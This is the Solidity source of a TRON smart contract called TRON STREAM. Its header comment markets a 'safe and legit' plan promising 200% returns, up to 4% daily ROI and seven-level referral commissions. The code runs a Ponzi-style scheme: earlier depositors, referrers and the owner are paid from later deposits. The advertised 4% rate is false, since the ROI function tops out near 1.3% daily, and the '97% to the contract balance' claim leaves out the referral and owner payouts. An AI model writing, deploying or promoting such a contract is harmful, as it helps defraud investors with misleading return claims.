//SourceUnit: tronstream.sol

pragma solidity ^0.4.25;

/*
 *	 TRON STREAM - Crowdfunding & Crowdsharing project runs on TRX blockchain smart-contract technology. Safe and legit!
 *   -------------------------------------------------------------------------------------------------------------------
 *      Website:  https://tronstream.com
 *      Support:  support@tronstream.com
 *      Telegram:  https://t.me/TronStream
 *
 *   HOW TO JOIN:
 *   -------------------------------------------------------------------------------------------------------------------
 *   1) Connect TRON browser extension TronLink or TronMask, or mobile wallet apps like TronWallet.
 *   2) Send any TRX amount (100 TRX minimum) using our website invest button.
 *   3) Wait for your earnings dividends.
 *   4) Withdraw earnings any time using our website "WITHDRAW" button.
 *   5) Reinvest to generate compound interest using our "REINVEST" button.
 *
 *   CONTRACT PLAN:
 *   -------------------------------------------------------------------------------------------------------------------
 *   <> EARN 200% OF YOUR ACTIVE DEPOSITS!
 *   <> 1% to 4% Daily return of Actual ROI.
 *      - Starts from a 1% ROI daily basis
 *      - Every 100,000 TRX in the smart contract balance, ROI will increase by 0.01% up to a maximum total ROI of 4%
 *   <> Referral Commission for Sharing and Growing the Community Fund (7 levels)
 *      - 5% direct referral
 *      - 2% referred level 2
 *      - 1% referred level 3
 *      - 0.5% referred level 4 to 7
 *   <> 20% of withdrawal autoreinvest for contract sustainability
 *   <> Earnings every moment, withdraw any time
 *
 *   FUNDS DISTRIBUTION:
 *   -------------------------------------------------------------------------------------------------------------------
 *   <> 97% Goes to contract balance for Community funding
 *   <> 3% Website, Technical Support and Admin Fee
 */

contract TronStream {

    using SafeMath for uint256;

    uint public totalPlayers;
    uint public totalPayout;
    uint public totalInvested;
    uint public totalReinvest;
    uint public activedeposits;
    uint private minDepositSize = 100000000;
    uint private interestRateDivisor = 1000000000000;
    uint public devCommission = 1;
    uint public commissionDivisor = 100;
     
    uint private releaseTime = 1605276000; //13 November, 14:00 UTC

    address private stream;
    address owner;

    struct Player {
        uint trxDeposit;
        uint time;
        uint interestProfit;
        uint affRewards;
        uint payoutSum;
        address affFrom;
        uint256 aff1sum; 
        uint256 aff2sum;
        uint256 aff3sum;
        uint256 aff4sum;
        uint256 aff5sum;
        uint256 aff6sum;
        uint256 aff7sum;
        uint256 aff8sum;
    }

    mapping(address => Player) public players;
    
    event Newbie(address indexed user, address indexed _referrer, uint _time);  
	event NewDeposit(address indexed user, uint256 amount, uint _time);  
	event Withdrawn(address indexed user, uint256 amount, uint _time);  
	event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount, uint _time);
	event Reinvest(address indexed user, uint256 amount, uint _time); 

    constructor(address _streamAddr) public {
		stream = _streamAddr;
		owner = msg.sender;
	}

    function register(address _addr, address _affAddr) private{

      Player storage player = players[_addr];

      player.affFrom = _affAddr;

      address _affAddr1 = _affAddr;
      address _affAddr2 = players[_affAddr1].affFrom;
      address _affAddr3 = players[_affAddr2].affFrom;
      address _affAddr4 = players[_affAddr3].affFrom;
      address _affAddr5 = players[_affAddr4].affFrom;
      address _affAddr6 = players[_affAddr5].affFrom;
      address _affAddr7 = players[_affAddr6].affFrom;
      address _affAddr8 = players[_affAddr7].affFrom;

      players[_affAddr1].aff1sum = players[_affAddr1].aff1sum.add(1);
      players[_affAddr2].aff2sum = players[_affAddr2].aff2sum.add(1);
      players[_affAddr3].aff3sum = players[_affAddr3].aff3sum.add(1);
      players[_affAddr4].aff4sum = players[_affAddr4].aff4sum.add(1);
      players[_affAddr5].aff5sum = players[_affAddr5].aff5sum.add(1);
      players[_affAddr6].aff6sum = players[_affAddr6].aff6sum.add(1);
      players[_affAddr7].aff7sum = players[_affAddr7].aff7sum.add(1);
      players[_affAddr8].aff8sum = players[_affAddr8].aff8sum.add(1);
    }

    function deposit(address _affAddr) public payable {
        if (now >= releaseTime){
            collect(msg.sender);    
        }
        require(msg.value >= minDepositSize, "not minimum amount!");
        uint depositAmount = msg.value;
        Player storage player = players[msg.sender];
        if (player.time == 0) {     
            if (now < releaseTime) {
                player.time = releaseTime;                 
            }
            else{
                player.time = now; 
            }    
            totalPlayers++;
            if(_affAddr != address(0) && players[_affAddr].trxDeposit > 0){
                emit Newbie(msg.sender, _affAddr, now);
                register(msg.sender, _affAddr);
            }
            else{
                emit Newbie(msg.sender, owner, now);
                register(msg.sender, owner);
            }
        }
        player.trxDeposit = player.trxDeposit.add(depositAmount);
        distributeRef(msg.value, player.affFrom);  
        totalInvested = totalInvested.add(depositAmount);
        activedeposits = activedeposits.add(depositAmount);
        emit NewDeposit(msg.sender, depositAmount, now);
        uint streamEarn = depositAmount.mul(devCommission).mul(3).div(commissionDivisor);
        stream.transfer(streamEarn);
    }

    function withdraw() public {
        collect(msg.sender);
        require(players[msg.sender].interestProfit > 0);
        transferPayout(msg.sender, players[msg.sender].interestProfit);        
    }

    function reinvest() public {
        collect(msg.sender);
        Player storage player = players[msg.sender];
        uint256 depositAmount = player.interestProfit;
        require(address(this).balance >= depositAmount);
        player.interestProfit = 0;
        player.trxDeposit = player.trxDeposit.add(depositAmount * 7 / 10);

        totalReinvest = totalReinvest.add(depositAmount);
        activedeposits = activedeposits.add(depositAmount * 7 / 10);
        emit Reinvest(msg.sender, depositAmount, now);
        distributeRef(depositAmount, player.affFrom);

        uint streamEarn = depositAmount.mul(devCommission).mul(3).div(commissionDivisor);
        stream.transfer(streamEarn);
    }

    function collect(address _addr) internal {
        Player storage player = players[_addr];
        
    	uint256 roi = getroi();
        uint secPassed = now.sub(player.time);

        if (secPassed > 0 && player.time > 0) {
            uint collectProfit = (player.trxDeposit.mul(secPassed.mul(roi))).div(interestRateDivisor);
            player.interestProfit = player.interestProfit.add(collectProfit);
            if (player.interestProfit >= player.trxDeposit.mul(2)){
                player.interestProfit = player.trxDeposit.mul(2);
            }    
            player.time = player.time.add(secPassed);
        }
    }

    function transferPayout(address _receiver, uint _amount) internal {
        if (_amount > 0 && _receiver != address(0)) {
            uint contractBalance = address(this).balance;
            if (contractBalance > 0) {
                uint payout = _amount > contractBalance ? contractBalance : _amount;
                totalPayout = totalPayout.add(payout);
                activedeposits = activedeposits.sub(payout * 4 / 10);
                activedeposits = activedeposits.add(payout.mul(1).div(5));

                Player storage player = players[_receiver];
                player.payoutSum = player.payoutSum.add(payout);
                player.interestProfit = player.interestProfit.sub(payout);
                player.trxDeposit = player.trxDeposit.sub(payout * 4 / 10);
                player.trxDeposit = player.trxDeposit.add(payout.mul(1).div(5));
 
                msg.sender.transfer(payout.mul(4).div(5));
                emit Withdrawn(msg.sender, payout, now);
            }
        }
    }

    function distributeRef(uint256 _trx, address _affFrom) private{

        uint256 _allaff = (_trx.mul(10)).div(100);

        address _affAddr1 = _affFrom;
        address _affAddr2 = players[_affAddr1].affFrom;
        address _affAddr3 = players[_affAddr2].affFrom;
        address _affAddr4 = players[_affAddr3].affFrom;
        address _affAddr5 = players[_affAddr4].affFrom;
        address _affAddr6 = players[_affAddr5].affFrom;
        address _affAddr7 = players[_affAddr6].affFrom;
        address _affAddr8 = players[_affAddr7].affFrom;

        uint256 _affRewards = 0;

        if (_affAddr1 != address(0)) {
            _affRewards = (_trx.mul(5)).div(100);
            _allaff = _allaff.sub(_affRewards);
            if (now > releaseTime) {
                collect(_affAddr1);
            }
            players[_affAddr1].affRewards = _affRewards.add(players[_affAddr1].affRewards);
            players[_affAddr1].trxDeposit = _affRewards.add(players[_affAddr1].trxDeposit);
            activedeposits = activedeposits.add(_affRewards);
            emit RefBonus(_affAddr1, msg.sender, 1, _affRewards, now);
        }

        if (_affAddr2 != address(0)) {
            _affRewards = (_trx.mul(2)).div(100);
            _allaff = _allaff.sub(_affRewards);
            if (now > releaseTime) {
                collect(_affAddr2);
            }
            players[_affAddr2].affRewards = _affRewards.add(players[_affAddr2].affRewards);
            players[_affAddr2].trxDeposit = _affRewards.add(players[_affAddr2].trxDeposit);
            activedeposits = activedeposits.add(_affRewards);
            emit RefBonus(_affAddr2, msg.sender, 2, _affRewards, now);
        }

        if (_affAddr3 != address(0)) {
            _affRewards = (_trx.mul(1)).div(100);
            _allaff = _allaff.sub(_affRewards);
            if (now > releaseTime) {
                collect(_affAddr3);
            }
            players[_affAddr3].affRewards = _affRewards.add(players[_affAddr3].affRewards);
            players[_affAddr3].trxDeposit = _affRewards.add(players[_affAddr3].trxDeposit);
            activedeposits = activedeposits.add(_affRewards);
            emit RefBonus(_affAddr3, msg.sender, 3, _affRewards, now);
        }

        if (_affAddr4 != address(0)) {
            _affRewards = (_trx.mul(1)).div(200);
            _allaff = _allaff.sub(_affRewards);
            if (now > releaseTime) {
               collect(_affAddr4);
            }
            players[_affAddr4].affRewards = _affRewards.add(players[_affAddr4].affRewards);
            players[_affAddr4].trxDeposit = _affRewards.add(players[_affAddr4].trxDeposit);
            activedeposits = activedeposits.add(_affRewards);
            emit RefBonus(_affAddr4, msg.sender, 4, _affRewards, now);
        }
        
        if (_affAddr5 != address(0)) {
            _affRewards = (_trx.mul(1)).div(200);
            _allaff = _allaff.sub(_affRewards);
            if (now > releaseTime) {
               collect(_affAddr5);
            }
            players[_affAddr5].affRewards = _affRewards.add(players[_affAddr5].affRewards);
            players[_affAddr5].trxDeposit = _affRewards.add(players[_affAddr5].trxDeposit);
            activedeposits = activedeposits.add(_affRewards);
            emit RefBonus(_affAddr5, msg.sender, 5, _affRewards, now);
        }

        if (_affAddr6 != address(0)) {
            _affRewards = (_trx.mul(1)).div(200);
            _allaff = _allaff.sub(_affRewards);
            if (now > releaseTime) {
               collect(_affAddr6);
            }
            players[_affAddr6].affRewards = _affRewards.add(players[_affAddr6].affRewards);
            players[_affAddr6].trxDeposit = _affRewards.add(players[_affAddr6].trxDeposit);
            activedeposits = activedeposits.add(_affRewards);
            emit RefBonus(_affAddr6, msg.sender, 6, _affRewards, now);
        }

        if (_affAddr7 != address(0)) {
            _affRewards = (_trx.mul(1)).div(200);
            _allaff = _allaff.sub(_affRewards);
            if (now > releaseTime) {
               collect(_affAddr7);
            }
            players[_affAddr7].affRewards = _affRewards.add(players[_affAddr7].affRewards);
            players[_affAddr7].trxDeposit = _affRewards.add(players[_affAddr7].trxDeposit);
            activedeposits = activedeposits.add(_affRewards);
            emit RefBonus(_affAddr7, msg.sender, 7, _affRewards, now);
        }

        if (_affAddr8 != address(0)) {
            _affRewards = 0;
            _allaff = _allaff.sub(_affRewards);
            players[_affAddr8].affRewards = _affRewards.add(players[_affAddr8].affRewards);
            players[_affAddr8].trxDeposit = _affRewards.add(players[_affAddr8].trxDeposit);
        }

        if(_allaff > 0 ){       
            _affRewards = _allaff;
            if (now > releaseTime) {
               collect(owner);   
            }
            players[owner].affRewards = _affRewards.add(players[owner].affRewards);
            players[owner].trxDeposit = _affRewards.add(players[owner].trxDeposit);
            activedeposits = activedeposits.add(_affRewards);
        }
    }

    function getProfit(address _addr) public view returns (uint) {
        address playerAddress= _addr;
        Player storage player = players[playerAddress];
        require(player.time > 0);

        if ( now < releaseTime){
            return 0;    
        }
        else{
            uint secPassed = now.sub(player.time);
	        uint256 roi = getroi();
            if (secPassed > 0) {
                uint collectProfit = (player.trxDeposit.mul(secPassed.mul(roi))).div(interestRateDivisor);
            }
            if (collectProfit.add(player.interestProfit) >= player.trxDeposit.mul(2)){
                return player.trxDeposit.mul(2);
            }
            else{
                return collectProfit.add(player.interestProfit);
            }
        }
    }
    
    function getContractBalanceRate() public view returns (uint256) {
	    uint256 contractBalance = address(this).balance;
		uint256 contractBalancePercent = contractBalance.div(1000000000000); 
		if (contractBalancePercent >= 30){
		    contractBalancePercent = 30;
		}		
		return contractBalancePercent;
	}

    function getroi() public view returns (uint256) { 
		uint256 PercentRate = getContractBalanceRate();
		uint256 roi = 115740 + PercentRate.mul(11574) ; //roi from 1%		
		return roi;
	}
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
}